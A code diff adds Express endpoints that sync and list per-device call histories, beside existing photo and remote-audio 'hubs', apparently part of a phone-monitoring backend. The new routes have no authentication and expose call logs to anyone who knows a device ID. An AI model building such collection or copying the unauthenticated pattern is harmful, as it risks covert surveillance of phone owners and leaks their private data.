@@ -233,6 +233,26 @@ router.delete('/photos/:deviceId/:photoId', async (req, res) => {
   res.json({ success: true, message: 'Photo deleted permanently from Cloudflare R2 and database' });
 });
 
+// Direct Call History Hub
+const liveCallsStorage = new Map<string, Array<any>>();
+
+router.post('/calls/sync', async (req, res) => {
+  const { deviceId, calls } = req.body || {};
+  const devId = deviceId || 'SN-U5ZY-78QZ';
+  const callList = Array.isArray(calls) ? calls : [];
+  
+  if (callList.length > 0) {
+    liveCallsStorage.set(devId, callList);
+  }
+  res.json({ success: true, count: callList.length });
+});
+
+router.get('/calls/list/:deviceId', async (req, res) => {
+  const devId = req.params.deviceId;
+  const calls = liveCallsStorage.get(devId) || [];
+  res.json({ calls });
+});
+
 // Direct Audio Hub
 const liveAudioStorage = new Map<string, Array<any>>();
 const pendingAudioTasks = new Map<string, number>(); // deviceId -> durationSeconds
